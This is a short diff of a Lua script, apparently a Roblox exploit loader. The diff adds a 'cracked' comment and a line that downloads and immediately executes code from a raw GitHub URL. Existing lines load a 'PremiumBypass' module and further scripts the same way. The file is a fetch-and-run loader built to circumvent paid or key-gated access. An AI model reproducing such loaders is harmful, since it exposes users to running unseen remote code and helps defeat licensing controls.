@@ -1,3 +1,5 @@
+-- i cracked alt_
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WhatsHisIdentifier/NoKey/refs/heads/main/Discord",true))()
 local PremiumModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/WhatsHisIdentifier/NoKey/refs/heads/main/PremiumBypass"))()
 local function LoadScript(url)
     local success, scriptContent = pcall(game.HttpGet, game, url)
